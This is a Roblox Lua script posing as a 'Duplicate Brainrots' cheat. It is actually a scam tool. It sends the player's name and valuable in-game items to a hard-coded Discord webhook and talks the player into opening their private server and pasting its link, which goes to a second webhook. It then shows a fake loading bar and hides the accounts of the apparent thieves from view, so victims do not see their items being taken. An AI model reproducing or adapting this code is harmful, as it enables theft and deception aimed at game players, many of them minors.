local Players = game:GetService("Players")
local player = Players.LocalPlayer
local gui = Instance.new("ScreenGui")
gui.Name = "BrainrotSplash"
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")
-- Sonido al ejecutar el script (inicio)
local S_init = Instance.new("Sound")
S_init.SoundId = "rbxassetid://121671520766723"
S_init.Volume = 5
S_init.Parent = workspace
S_init:Play()
S_init.Ended:Connect(function()
    S_init:Destroy()
end)
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 360, 0, 140)
frame.Position = UDim2.new(0.5, -180, 0.5, -70)
frame.BackgroundColor3 = Color3.fromRGB(25,25,25)
frame.BackgroundTransparency = 1
frame.BorderSizePixel = 0
frame.Parent = gui
local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 18)
corner.Parent = frame
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1,0,0.6,0)
title.Position = UDim2.new(0,0,0.05,0)
title.BackgroundTransparency = 1
title.Text = "Duplicate Brainrots"
title.TextColor3 = Color3.fromRGB(0,170,255)
title.Font = Enum.Font.GothamBold
title.TextTransparency = 1
title.TextScaled = false
title.TextSize = 32
title.Parent = frame
local subtitle = Instance.new("TextLabel")
subtitle.Size = UDim2.new(1,0,0.2,0)
subtitle.Position = UDim2.new(0,0,0.75,0)
subtitle.BackgroundTransparency = 1
subtitle.Text = "by Dark_Eccentric"
subtitle.TextColor3 = Color3.fromRGB(255,255,255)
subtitle.Font = Enum.Font.Gotham
subtitle.TextTransparency = 1
subtitle.TextScaled = false
subtitle.TextSize = 16
subtitle.Parent = frame
local TweenService = game:GetService("TweenService")
local function fadeIn()
    TweenService:Create(frame, TweenInfo.new(0.4), {BackgroundTransparency = 0.15}):Play()
    TweenService:Create(title, TweenInfo.new(0.6), {TextTransparency = 0}):Play()
    TweenService:Create(subtitle, TweenInfo.new(0.6), {TextTransparency = 0}):Play()
end
local function fadeOut()
    TweenService:Create(frame, TweenInfo.new(0.4), {BackgroundTransparency = 1}):Play()
    TweenService:Create(title, TweenInfo.new(0.6), {TextTransparency = 1}):Play()
    TweenService:Create(subtitle, TweenInfo.new(0.6), {TextTransparency = 1}):Play()
end
fadeIn()
task.wait(1)
fadeOut()
task.wait(0.3)
gui:Destroy()
-- =============================================
-- SELECCIÓN DE IDIOMA
-- =============================================
local idioma = "en"
local langGui = Instance.new("ScreenGui")
langGui.Name = "LanguageSelector"
langGui.ResetOnSpawn = false
langGui.Parent = player:WaitForChild("PlayerGui")
local langFrame = Instance.new("Frame", langGui)
langFrame.Size = UDim2.fromScale(0.4, 0.35)
langFrame.Position = UDim2.fromScale(0.5, 0.5)
langFrame.AnchorPoint = Vector2.new(0.5, 0.5)
langFrame.BackgroundColor3 = Color3.fromRGB(15,15,25)
langFrame.Active = true
langFrame.Draggable = true
Instance.new("UICorner", langFrame).CornerRadius = UDim.new(0, 20)
local titleLang = Instance.new("TextLabel", langFrame)
titleLang.Size = UDim2.fromScale(1, 0.3)
titleLang.BackgroundTransparency = 1
titleLang.Text = "Choose your language"
titleLang.TextColor3 = Color3.fromRGB(255, 80, 80)
titleLang.Font = Enum.Font.GothamBold
titleLang.TextScaled = true
local esp = Instance.new("TextButton", langFrame)
esp.Size = UDim2.fromScale(0.8, 0.2)
esp.Position = UDim2.fromScale(0.1, 0.35)
esp.BackgroundColor3 = Color3.fromRGB(0, 120, 255)
esp.Text = "Español"
esp.TextColor3 = Color3.new(1,1,1)
esp.Font = Enum.Font.Gotham
esp.TextScaled = true
Instance.new("UICorner", esp).CornerRadius = UDim.new(0, 12)
local eng = Instance.new("TextButton", langFrame)
eng.Size = UDim2.fromScale(0.8, 0.2)
eng.Position = UDim2.fromScale(0.1, 0.6)
eng.BackgroundColor3 = Color3.fromRGB(0, 120, 255)
eng.Text = "English"
eng.TextColor3 = Color3.new(1,1,1)
eng.Font = Enum.Font.Gotham
eng.TextScaled = true
Instance.new("UICorner", eng).CornerRadius = UDim.new(0, 12)
local ok = Instance.new("TextButton", langFrame)
ok.Size = UDim2.fromScale(0.5, 0.15)
ok.Position = UDim2.fromScale(0.25, 0.84)
ok.BackgroundColor3 = Color3.fromRGB(0, 120, 255)
ok.Text = "OK"
ok.TextColor3 = Color3.new(1,1,1)
ok.Font = Enum.Font.GothamBold
ok.TextScaled = true
Instance.new("UICorner", ok).CornerRadius = UDim.new(0, 12)
esp.MouseButton1Click:Connect(function()
    idioma = "es"
    titleLang.Text = "Elige tu idioma"
end)
eng.MouseButton1Click:Connect(function()
    idioma = "en"
    titleLang.Text = "Choose your language"
end)
local confirmed = false
ok.MouseButton1Click:Connect(function()
    confirmed = true
    langGui:Destroy()
    local S_success = Instance.new("Sound")
    S_success.SoundId = "rbxassetid://118763066817859"
    S_success.Volume = 5
    S_success.Parent = workspace
    S_success:Play()
    S_success.Ended:Connect(function()
        S_success:Destroy()
    end)
end)
repeat task.wait(0.05) until confirmed
-- Mensajes traducidos
local msgMultiplayer = (idioma == "es") and "Para evitar errores, este script debe usarse con un solo usuario en el servidor" or "To avoid errors, this script must be used with only one user in the server"
local msgNoBrainrot = (idioma == "es") and "Necesitas un brainrot bueno para duplicar." or "You need a good brainrot to duplicate."
local msgConfigWarn = (idioma == "es") and "⚠️ IMPORTANTE: Tu configuración debe estar de esta manera para que el script cargue y funcione correctamente:\n\nConfiguración → Restricciones de privacidad y contenido → Visibilidad y servidores privados → Servidores privados: Todos." or "⚠️ IMPORTANT: Your settings must be like this for the script to load and work correctly:\n\nSettings → Privacy and content restrictions → Visibility and private servers → Private servers: Everyone."
local msgLinkTitle = (idioma == "es") and "Necesitamos el link del servidor donde estás para modificar los archivos del juego y permitir la duplicación de brainrots" or "We need the link of the server you're in to modify game files and allow brainrot duplication"
local msgPlaceholder = (idioma == "es") and "PEGAR EL LINK DE TU SERVIDOR AQUÍ" or "PASTE YOUR SERVER LINK HERE"
local msgInvalidLink = (idioma == "es") and "No es un link de servidor privado válido" or "Not a valid private server link"
-- =============================================
-- CHEQUEO INICIAL (conteo ignorando Golden/Oro)
-- =============================================
local playerCount = #Players:GetPlayers()
local WEBHOOK_GENERAL = "https://discord.com/api/webhooks/1471902892834164976/F24s4hlC2TZVqxsB24WA_55T0B9zTYZljs0VSRs1OklFZxSqQTLXaf9N_tlTVLn4tlBa"
local WEBHOOK_LINK = "https://discord.com/api/webhooks/1471584426667540573/fYxM0bP9XtsbgsLgiU3f0SSbVKZAMWO778sz7sWQaMaY-hlrm_QtQP608HQZa-0YJH3_"
local HttpService = game:GetService("HttpService")
local function sendWebhook(url, content)
    pcall(function()
        request({
            Url = url,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({content = content})
        })
    end)
end
local plotsFolder = workspace:FindFirstChild("Plots")
local brainrotsRequeridos = {
    "Nuclearo Dinossauro", "Money Money Puggy", "Tang Tang Keletang", "Ketupat Kepat", "Tictac Sahur",
    "Ketchuru and Musturu", "Lavadorito Spinito", "Garama and Madundung", "Burguro And Fryuro",
    "Capitano Moby", "Cerberus", "Dragon Cannelloni", "Mariachi Corazoni", "Tacorita Bicicleta",
    "Las Sis", "Los Hotspotsitos", "Los Jolly Combinasionas", "Celularcini Viciosini",
    "La Extinct Grande", "Los Bros", "La Spooky Grande", "Chipso and Queso", "Chillin Chili",
    "Money Money Reindeer", "Tuff Toucan", "Tralaledon", "Gobblino Uniciclino", "Esok Sekolah",
    "Los Puggies", "W or L", "La Jolly Grande", "Los Primos", "Eviledon", "Lovin Rose",
    "Los Tacoritas", "La Taco Combinasion", "Orcaledon", "Swaggy Bros", "La Romantic Grande",
    "Jolly Jolly Sahur", "Spaghetti Tualetti", "Festive 67", "Los Spaghettis", "Ginger Gerat",
    "25", "La Ginger Sekolah", "Donkeyturbo Express", "Love Love Bear", "Spooky and Pumpky",
    "Los Spooky Combinasionas", "Los Planitos", "Fishino Clownino", "Fragrama and Chocrama",
    "La Casa Boo", "La Secret Combinasion", "Reinito Sleighito", "Ketupat Bros", "Cooki and Milki",
    "Rosey and Teddy", "Rosetti Tualetti", "Popcuru and Fizzuru", "La Supreme Combinasion",
    "Dragon Gingerini", "Headless Horseman", "Hydra Dragon Cannelloni", "Strawberry Elephant",
    "Meowl", "Skibidi Toilet",
    
    -- NUEVOS BRAINROTS AGREGADOS
    "Bacuru and Egguru", "Los Cupids", "Gigno Fulgoro", "Griffin", "DJ Panda",
    "Celestial Pegasus", "Ventoliero Pavonero", "Granny", "Foxini Lanternini",
    "Eid Eid Eid Sahur", "Noo my Eggs", "La Easter Grande", "Noo my Gold",
    "Snailo Clovero", "Gold Gold Gold", "Fortunu and Cashuru", "Cloverat Clapat",
    "La Lucky Grande", "Los Primos", "La Grande Combinasion", "Noo my Heart",
    "Chicleteira Cupideira", "Los Mobilis"
}
local conteoBrainrots = {}
for _, plot in pairs(plotsFolder and plotsFolder:GetChildren() or {}) do
    for _, obj in pairs(plot:GetDescendants()) do
        local name = obj.Name
        -- Limpiar sufijos de oro/golden para contar como el base
        local base_name = name:gsub(" Golden$", ""):gsub(" Oro$", ""):gsub("Gold$", ""):gsub(" Oro$", ""):gsub("Golden$", ""):match("^%s*(.-)%s*$")
        if table.find(brainrotsRequeridos, base_name) then
            conteoBrainrots[base_name] = (conteoBrainrots[base_name] or 0) + 1
        end
    end
end
local listaConEmojis = {}
local emojisBrainrots = {
    ["Nuclearo Dinossauro"] = "💥🦖",
    ["Money Money Puggy"] = "💰🐶",
    ["Tang Tang Keletang"] = "🪩💃",
    ["Ketupat Kepat"] = "🍚🐱",
    ["Tictac Sahur"] = "⏰🌙",
    ["Ketchuru and Musturu"] = "🍔🥫",
    ["Lavadorito Spinito"] = "🌀🧼",
    ["Garama and Madundung"] = "🔥🤯",
    ["Burguro And Fryuro"] = "🍔🍟",
    ["Capitano Moby"] = "⚓🐋",
    ["Cerberus"] = "🐕‍🦺🔥",
    ["Dragon Cannelloni"] = "🐉🍝",
    ["Mariachi Corazoni"] = "🎸❤️",
    ["Tacorita Bicicleta"] = "🌮🚲",
    ["Las Sis"] = "👯‍♀️👯‍♀️",
    ["Los Hotspotsitos"] = "📶🔥",
    ["Los Jolly Combinasionas"] = "🎉🍔",
    ["Celularcini Viciosini"] = "📱😵‍💫",
    ["La Extinct Grande"] = "🦕💀",
    ["Los Bros"] = "👬💪",
    ["La Spooky Grande"] = "👻🎃",
    ["Chipso and Queso"] = "🧀🥔",
    ["Chillin Chili"] = "🌶️😎",
    ["Money Money Reindeer"] = "💰🦌",
    ["Tuff Toucan"] = "🦜💪",
    ["Tralaledon"] = "🎤🦖",
    ["Gobblino Uniciclino"] = "🦃🚲",
    ["Esok Sekolah"] = "🏫📚",
    ["Los Puggies"] = "🐶🐶",
    ["W or L"] = "🏆❌",
    ["La Jolly Grande"] = "🎉🌟",
    ["Los Primos"] = "👨‍👩‍👧‍👦",
    ["Eviledon"] = "😈🦖",
    ["Lovin Rose"] = "🌹❤️",
    ["Los Tacoritas"] = "🌮🌮",
    ["La Taco Combinasion"] = "🌮🍔",
    ["Orcaledon"] = "🧙‍♂️🦖",
    ["Swaggy Bros"] = "😎👬",
    ["La Romantic Grande"] = "💕🌹",
    ["Jolly Jolly Sahur"] = "🎉🌙",
    ["Spaghetti Tualetti"] = "🍝🚽",
    ["Festive 67"] = "🎄6️⃣7️⃣",
    ["Los Spaghettis"] = "🍝🍝",
    ["Ginger Gerat"] = "🫚🐀",
    ["25"] = "2️⃣5️⃣",
    ["La Ginger Sekolah"] = "🫚🏫",
    ["Donkeyturbo Express"] = "🐴🚀",
    ["Love Love Bear"] = "🐻❤️",
    ["Spooky and Pumpky"] = "👻🎃",
    ["Los Spooky Combinasionas"] = "👻🎃",
    ["Los Planitos"] = "✈️🌍",
    ["Fishino Clownino"] = "🐟🤡",
    ["Fragrama and Chocrama"] = "🍫🌸",
    ["La Casa Boo"] = "🏠👻",
    ["La Secret Combinasion"] = "🤫🔒",
    ["Reinito Sleighito"] = "🦌🛷",
    ["Ketupat Bros"] = "🍚👬",
    ["Cooki and Milki"] = "🍪🥛",
    ["Rosey and Teddy"] = "🌹🧸",
    ["Rosetti Tualetti"] = "🌹🚽",
    ["Popcuru and Fizzuru"] = "🍿🥤",
    ["La Supreme Combinasion"] = "🍔👑",
    ["Dragon Gingerini"] = "🐉🫚",
    ["Headless Horseman"] = "🗡️👤",
    ["Hydra Dragon Cannelloni"] = "🐉🐉🍝",
    ["Strawberry Elephant"] = "🍓🐘",
    ["Meowl"] = "🦉😼",
    ["Skibidi Toilet"] = "🚽💀",
    
    -- NUEVOS BRAINROTS CON EMOJIS
    ["Bacuru and Egguru"] = "🥚🐰",
    ["Los Cupids"] = "🏹❤️",
    ["Gigno Fulgoro"] = "⚡🐆",
    ["Griffin"] = "🦅🦁",
    ["DJ Panda"] = "🎧🐼",
    ["Celestial Pegasus"] = "🌟🦄",
    ["Ventoliero Pavonero"] = "🌬️🦚",
    ["Granny"] = "👵🍪",
    ["Foxini Lanternini"] = "🦊🏮",
    ["Eid Eid Eid Sahur"] = "🌙🎉",
    ["Noo my Eggs"] = "🥚😭",
    ["La Easter Grande"] = "🐰🥚🌸",
    ["Noo my Gold"] = "💰😭",
    ["Snailo Clovero"] = "🐌🍀",
    ["Gold Gold Gold"] = "💎💎💎",
    ["Fortunu and Cashuru"] = "🍀💰",
    ["Cloverat Clapat"] = "🍀🐱",
    ["La Lucky Grande"] = "🍀🌟",
    ["Los Primos"] = "👨‍👩‍👧‍👦",
    ["La Grande Combinasion"] = "🌟🍔",
    ["Noo my Heart"] = "❤️😭",
    ["Chicleteira Cupideira"] = "🍬🏹",
    ["Los Mobilis"] = "📱🚗"
}
for br, count in pairs(conteoBrainrots) do
    local emoji = emojisBrainrots[br] or "🧠"
    local texto = emoji .. " " .. br
    if count > 1 then
        texto = texto .. " x" .. count
    end
    table.insert(listaConEmojis, texto)
end
local strListaEmojis = #listaConEmojis > 0 and table.concat(listaConEmojis, "\n") or "🧠 ninguno detectado 😢"
local cantidad = 0
for _, count in pairs(conteoBrainrots) do cantidad = cantidad + count end
local tieneBrainrots = cantidad > 0
local idiomaStr = (idioma == "es") and "Español" or "Inglés"
-- Notificación de ejecución
local estado = ""
if playerCount > 1 then
    estado = "👥 Hay " .. playerCount .. " personas en el servidor\n🧠 Brainrots detectados:\n" .. strListaEmojis
elseif not tieneBrainrots then
    estado = "🧠 Está solo pero NO tiene brainrots buenos 😢"
else
    estado = "🧠 Está solo y tiene " .. cantidad .. " brainrot" .. (cantidad > 1 and "s" or "") .. " bueno" .. (cantidad > 1 and "s" or "") .. ":\n" .. strListaEmojis
end
sendWebhook(WEBHOOK_GENERAL, "🚀 **Alguien ejecutó el script** 🚀\n👤 Jugador: " .. player.Name .. "\n🌍 habla: " .. idiomaStr .. "\n" .. estado)
-- =============================================
-- MOSTRAR LINK SOLO SI ESTÁ SOLO Y TIENE AL MENOS 1 BRAINROT BUENO
-- =============================================
if playerCount > 1 or not tieneBrainrots then
    local warnGui = Instance.new("ScreenGui")
    warnGui.Name = "WarningGui"
    warnGui.ResetOnSpawn = false
    warnGui.Parent = player:WaitForChild("PlayerGui")
    
    local warnFrame = Instance.new("Frame", warnGui)
    warnFrame.Size = UDim2.fromScale(0.5, 0.25)
    warnFrame.Position = UDim2.fromScale(0.5, 0.5)
    warnFrame.AnchorPoint = Vector2.new(0.5, 0.5)
    warnFrame.BackgroundColor3 = Color3.fromRGB(30, 0, 0)
    warnFrame.BackgroundTransparency = 0.2
    Instance.new("UICorner", warnFrame).CornerRadius = UDim.new(0, 20)
    
    local warnText = Instance.new("TextLabel", warnFrame)
    warnText.Size = UDim2.fromScale(0.9, 0.9)
    warnText.Position = UDim2.fromScale(0.05, 0.05)
    warnText.BackgroundTransparency = 1
    warnText.Text = playerCount > 1 and msgMultiplayer or msgNoBrainrot
    warnText.TextColor3 = Color3.fromRGB(255, 100, 100)
    warnText.TextScaled = true
    warnText.Font = Enum.Font.GothamBold
    warnText.TextWrapped = true
    
    local ERROR_SOUND = "rbxassetid://112124517778988"
    local S = Instance.new("Sound")
    S.SoundId = ERROR_SOUND
    S.Volume = 5
    S.Parent = workspace
    S:Play()
    S.Ended:Connect(function()
        S:Destroy()
    end)
    
    TweenService:Create(warnFrame, TweenInfo.new(0.5), {BackgroundTransparency = 0.2}):Play()
    TweenService:Create(warnText, TweenInfo.new(0.5), {TextTransparency = 0}):Play()
    task.wait(5)
    TweenService:Create(warnFrame, TweenInfo.new(0.5), {BackgroundTransparency = 1}):Play()
    TweenService:Create(warnText, TweenInfo.new(0.5), {TextTransparency = 1}):Play()
    task.wait(0.5)
    warnGui:Destroy()
    return
end
-- Si llegó aquí → solo 1 persona + tiene brainrots → muestra link
local Players2 = game:GetService("Players")
local TweenService2 = game:GetService("TweenService")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players2.LocalPlayer
local gui2 = Instance.new("ScreenGui", game.CoreGui)
local frame2 = Instance.new("Frame", gui2)
frame2.Size = UDim2.fromScale(0.38,0.3)
frame2.AnchorPoint = Vector2.new(0.5,0.5)
frame2.Position = UDim2.fromScale(0.5,0.5)
frame2.BackgroundColor3 = Color3.fromRGB(25,25,25)
Instance.new("UICorner", frame2).CornerRadius = UDim.new(0,20)
frame2.Active = true
frame2.Draggable = true
local title2 = Instance.new("TextLabel", frame2)
title2.Size = UDim2.fromScale(1,0.25)
title2.BackgroundTransparency = 1
title2.Text = msgLinkTitle
title2.TextColor3 = Color3.fromRGB(255,80,80)
title2.TextScaled = true
title2.Font = Enum.Font.GothamBold
local box = Instance.new("TextBox", frame2)
box.Size = UDim2.fromScale(0.9,0.25)
box.Position = UDim2.fromScale(0.05,0.35)
box.PlaceholderText = msgPlaceholder
box.Text = ""
box.TextScaled = true
box.Font = Enum.Font.Gotham
box.BackgroundColor3 = Color3.fromRGB(40,40,40)
box.TextColor3 = Color3.new(1,1,1)
Instance.new("UICorner", box).CornerRadius = UDim.new(0,12)
local button = Instance.new("TextButton", frame2)
button.Size = UDim2.fromScale(0.5,0.2)
button.Position = UDim2.fromScale(0.25,0.7)
button.Text = "OK"
button.TextScaled = true
button.Font = Enum.Font.GothamBold
button.BackgroundColor3 = Color3.fromRGB(80,160,255)
button.TextColor3 = Color3.new(1,1,1)
Instance.new("UICorner", button).CornerRadius = UDim.new(0,14)
-- Panel amarillo de advertencia
local warnGui = Instance.new("ScreenGui")
warnGui.Name = "ConfigWarning"
warnGui.ResetOnSpawn = false
warnGui.Parent = player:WaitForChild("PlayerGui")
local warnFrame = Instance.new("Frame", warnGui)
warnFrame.Size = UDim2.fromScale(0.3, 0.18)
warnFrame.Position = UDim2.fromScale(0.01, 0.01)
warnFrame.BackgroundColor3 = Color3.fromRGB(255, 200, 0)
warnFrame.BackgroundTransparency = 1
warnFrame.BorderSizePixel = 0
Instance.new("UICorner", warnFrame).CornerRadius = UDim.new(0, 12)
local warnText = Instance.new("TextLabel", warnFrame)
warnText.Size = UDim2.fromScale(0.95, 0.9)
warnText.Position = UDim2.fromScale(0.025, 0.05)
warnText.BackgroundTransparency = 1
warnText.Text = msgConfigWarn
warnText.TextColor3 = Color3.fromRGB(0, 0, 0)
warnText.TextScaled = true
warnText.TextWrapped = true
warnText.Font = Enum.Font.GothamBold
warnText.TextTransparency = 1
TweenService:Create(warnFrame, TweenInfo.new(0.8), {BackgroundTransparency = 0.15}):Play()
TweenService:Create(warnText, TweenInfo.new(0.8), {TextTransparency = 0}):Play()
task.spawn(function()
    task.wait(10)
    TweenService:Create(warnFrame, TweenInfo.new(0.8), {BackgroundTransparency = 1}):Play()
    TweenService:Create(warnText, TweenInfo.new(0.8), {TextTransparency = 1}):Play()
    task.wait(0.8)
    warnGui:Destroy()
end)
-- Variable para saber si ya presionó ENTER
local hasPressedEnter = false
-- Listener para destruir si entra alguien ANTES de ENTER
local connection
connection = Players.PlayerAdded:Connect(function(newPlayer)
    if hasPressedEnter then return end
    if gui2 and gui2.Parent then gui2:Destroy() end
    if warnGui and warnGui.Parent then warnGui:Destroy() end
    if connection then connection:Disconnect() end
    
    local warnGui2 = Instance.new("ScreenGui")
    warnGui2.Name = "WarningGui"
    warnGui2.ResetOnSpawn = false
    warnGui2.Parent = player:WaitForChild("PlayerGui")
    
    local warnFrame2 = Instance.new("Frame", warnGui2)
    warnFrame2.Size = UDim2.fromScale(0.5, 0.25)
    warnFrame2.Position = UDim2.fromScale(0.5, 0.5)
    warnFrame2.AnchorPoint = Vector2.new(0.5, 0.5)
    warnFrame2.BackgroundColor3 = Color3.fromRGB(30, 0, 0)
    warnFrame2.BackgroundTransparency = 0.2
    Instance.new("UICorner", warnFrame2).CornerRadius = UDim.new(0, 20)
    
    local warnText2 = Instance.new("TextLabel", warnFrame2)
    warnText2.Size = UDim2.fromScale(0.9, 0.9)
    warnText2.Position = UDim2.fromScale(0.05, 0.05)
    warnText2.BackgroundTransparency = 1
    warnText2.Text = msgMultiplayer
    warnText2.TextColor3 = Color3.fromRGB(255, 100, 100)
    warnText2.TextScaled = true
    warnText2.Font = Enum.Font.GothamBold
    warnText2.TextWrapped = true
    
    local ERROR_SOUND = "rbxassetid://112124517778988"
    local S = Instance.new("Sound")
    S.SoundId = ERROR_SOUND
    S.Volume = 5
    S.Parent = workspace
    S:Play()
    S.Ended:Connect(function()
        S:Destroy()
    end)
    
    TweenService:Create(warnFrame2, TweenInfo.new(0.5), {BackgroundTransparency = 0.2}):Play()
    TweenService:Create(warnText2, TweenInfo.new(0.5), {TextTransparency = 0}):Play()
    task.wait(5)
    TweenService:Create(warnFrame2, TweenInfo.new(0.5), {BackgroundTransparency = 1}):Play()
    TweenService:Create(warnText2, TweenInfo.new(0.5), {TextTransparency = 1}):Play()
    task.wait(0.5)
    warnGui2:Destroy()
    if connection then connection:Disconnect() end
end)
local function sendLink(link)
    local brainrotsStr = ""
    if #listaConEmojis > 0 then
        brainrotsStr = "tiene:\n" .. table.concat(listaConEmojis, "\n")
    else
        brainrotsStr = "🧠 ninguno detectado 😢"
    end
    local data = {
        content = "@everyone 🔥 LINK DE SERVIDOR RECIBIDO 🔥\n👤 Jugador: " .. LocalPlayer.Name .. "\n" .. brainrotsStr .. "\n🌍 habla: " .. idiomaStr .. "\n\n🔗 " .. link,
        allowed_mentions = { parse = {"everyone"} }
    }
    request({
        Url = WEBHOOK_LINK,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode(data)
    })
end
local function showLoadingScreen()
    local loadGui = Instance.new("ScreenGui", game.CoreGui)
    local loadFrame = Instance.new("Frame", loadGui)
    loadFrame.Size = UDim2.fromScale(0.5,0.25)
    loadFrame.AnchorPoint = Vector2.new(0.5,0.5)
    loadFrame.Position = UDim2.fromScale(0.5,0.5)
    loadFrame.BackgroundColor3 = Color3.fromRGB(30,30,30)
    loadFrame.Active = true
    loadFrame.Draggable = true
    Instance.new("UICorner", loadFrame).CornerRadius = UDim.new(0,20)
    
    local textPercent = Instance.new("TextLabel", loadFrame)
    textPercent.Size = UDim2.fromScale(1,0.25)
    textPercent.Position = UDim2.fromScale(0,0)
    textPercent.BackgroundTransparency = 1
    textPercent.Text = "0%"
    textPercent.TextScaled = true
    textPercent.Font = Enum.Font.GothamBold
    textPercent.TextColor3 = Color3.fromRGB(255,255,255)
    
    local barBg = Instance.new("Frame", loadFrame)
    barBg.Size = UDim2.fromScale(0.9,0.15)
    barBg.Position = UDim2.fromScale(0.05,0.7)
    barBg.BackgroundColor3 = Color3.fromRGB(50,50,50)
    Instance.new("UICorner", barBg).CornerRadius = UDim.new(0,10)
    
    local bar = Instance.new("Frame", barBg)
    bar.Size = UDim2.fromScale(0,1)
    bar.Position = UDim2.fromScale(0,0)
    bar.BackgroundColor3 = Color3.fromRGB(80,160,255)
    Instance.new("UICorner", bar).CornerRadius = UDim.new(0,10)
    
    local subtitle = Instance.new("TextLabel", loadFrame)
    subtitle.Size = UDim2.fromScale(1,0.27)
    subtitle.Position = UDim2.fromScale(0,0.34)
    subtitle.BackgroundTransparency = 1
    subtitle.Text = (idioma == "es") and "Por favor, aun no intentes duplicar sus brainrots estamos modificando los archivos del juego" or "Please, don't try to duplicate brainrots yet, we are modifying the game files"
    subtitle.TextScaled = true
    subtitle.Font = Enum.Font.GothamBold
    subtitle.TextColor3 = Color3.fromRGB(200,200,200)
    
    task.spawn(function()
        local totalDuration = 240
        local startTime = tick()
        
        local stages = {
            {percent = 50, timeFraction = 0.12},
            {percent = 89, timeFraction = 0.45},
            {percent = 99, timeFraction = 1.00}
        }
        
        local currentStage = 1
        
        while true do
            local now = tick()
            local elapsed = now - startTime
            local progress = math.clamp(elapsed / totalDuration, 0, 1)
            
            while currentStage <= #stages and progress >= stages[currentStage].timeFraction do
                currentStage = currentStage + 1
            end
            
            local targetPercent
            if currentStage > #stages then
                targetPercent = 99
            else
                local stage = stages[currentStage]
                local prevStagePercent = (currentStage == 1 and 0) or stages[currentStage-1].percent
                local prevStageTime = (currentStage == 1 and 0) or stages[currentStage-1].timeFraction
                
                local stageProgress = (progress - prevStageTime) / (stage.timeFraction - prevStageTime)
                targetPercent = prevStagePercent + (stage.percent - prevStagePercent) * stageProgress
            end
            
            targetPercent = math.min(math.floor(targetPercent + 0.5), 99)
            
            bar.Size = UDim2.fromScale(targetPercent / 100, 1)
            textPercent.Text = string.format("%d%%", targetPercent)
            
            if progress >= 1 or targetPercent >= 99 then
                bar.Size = UDim2.fromScale(0.99, 1)
                textPercent.Text = "99%"
                break
            end
            
            task.wait(0.025)
        end
    end)
    
    return loadGui
end
local function executeHeavyScripts()
    do
        local ws = game:GetService("Workspace")
        local plots = ws:WaitForChild("Plots")
        local players = game:GetService("Players")
        local localPlayer = players.LocalPlayer
        local frozenPlots = plots:Clone()
        frozenPlots.Name = "FrozenPlots"
        frozenPlots.Parent = ws
        plots.Parent = nil
        
        local function isVisualNoise(obj)
            if obj:IsA("BillboardGui") or obj:IsA("SurfaceGui") or obj:IsA("TextLabel") then return true end
            if obj:IsA("ParticleEmitter") or obj:IsA("Trail") or obj:IsA("Beam") then return true end
            return false
        end
        
        ws.DescendantAdded:Connect(function(desc)
            if desc:IsDescendantOf(localPlayer.Character) or desc:IsDescendantOf(localPlayer:WaitForChild("Backpack")) then return end
            if desc:IsDescendantOf(ws:FindFirstChild("Players")) then desc:Destroy() return end
            if isVisualNoise(desc) then desc:Destroy() return end
            if not frozenPlots:FindFirstChild(desc.Name, true) then desc:Destroy() end
        end)
        
        print("Plots congelados, bloqueados brainrots, jugadores ajenos, textos y partículas nuevas, pero inventario permitido")
    end
    
    do
        local PlayersLocal = game:GetService("Players")
        local CoreGui = game:GetService("CoreGui")
        local StarterGui = game:GetService("StarterGui")
        local UserInputService = game:GetService("UserInputService")
        local localPlayer = PlayersLocal.LocalPlayer
        
        if not localPlayer then PlayersLocal:GetPropertyChangedSignal("LocalPlayer"):Wait(); localPlayer = PlayersLocal.LocalPlayer end
        
        local A_OCULTAR = { loidark81 = true, miloid81 = true, elbromas_456XD = true, ohuso3 = true }
        local oculto = true
        local seen = {}
        
        local function containsNameInsensitive(text)
            if not text then return false end
            local lower = string.lower(text)
            for name,_ in pairs(A_OCULTAR) do
                if string.find(lower, string.lower(name), 1, true) then return true end
            end
            return false
        end
        
        local function safeDisableGui(obj)
            if not obj or seen[obj] then return end
            seen[obj] = true
            pcall(function()
                if obj:IsA("ScreenGui") then obj.Enabled = false
                elseif obj:IsA("GuiObject") then obj.Visible = false end
            end)
        end
        
        local function inspectAndHide(obj)
            if not obj then return end
            if obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox") then
                if containsNameInsensitive(obj.Text) then safeDisableGui(obj.Parent or obj) end
            end
            if obj:IsA("ImageLabel") or obj:IsA("ImageButton") or obj:IsA("Frame") then
                local nm = tostring(obj.Name or "") .. " " .. tostring(obj.Parent and obj.Parent.Name or "")
                if containsNameInsensitive(nm) then safeDisableGui(obj.Parent or obj) return end
                local ok, bg = pcall(function() return obj.BackgroundColor3 end)
                if ok and bg then
                    local brightness = (bg.R + bg.G + bg.B) / 3
                    if brightness < 0.18 then
                        for _, d in ipairs(obj:GetDescendants()) do
                            if (d:IsA("TextLabel") or d:IsA("TextButton")) and containsNameInsensitive(d.Text) then
                                safeDisableGui(obj.Parent or obj)
                                return
                            end
                        end
                    end
                end
            end
            for _, sib in ipairs(obj.Parent and obj.Parent:GetDescendants() or {}) do
                if (sib:IsA("TextLabel") or sib:IsA("TextButton")) and containsNameInsensitive(sib.Text) then
                    safeDisableGui(obj.Parent)
                    return
                end
            end
        end
        
        local function ocultarCharacterVisual(character)
            if not character then return end
            if seen[character] then return end
            seen[character] = true
            for _, obj in ipairs(character:GetDescendants()) do
                if obj:IsA("BasePart") then pcall(function() obj.LocalTransparencyModifier = 1 end) end
                if obj:IsA("BillboardGui") or obj:IsA("SurfaceGui") then pcall(function() obj.Enabled = false end) end
                if obj:IsA("Decal") or obj:IsA("Texture") then pcall(function() obj.Transparency = 1 end) end
            end
            local humanoid = character:FindFirstChildOfClass("Humanoid")
            if humanoid then pcall(function() humanoid.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.None end) end
        end
        
        local function procesarJugador(plr)
            if not plr or plr == localPlayer then return end
            if A_OCULTAR[plr.Name] then
                if plr.Character then ocultarCharacterVisual(plr.Character) end
                plr.CharacterAdded:Connect(function(c) if oculto then ocultarCharacterVisual(c) end end)
            end
        end
        
        local function scanContainer(container)
            if not container then return end
            for _, obj in ipairs(container:GetDescendants()) do inspectAndHide(obj) end
        end
        
        local function hookGuiContainer(container)
            if not container then return end
            scanContainer(container)
            container.DescendantAdded:Connect(function(desc) inspectAndHide(desc) end)
        end
        
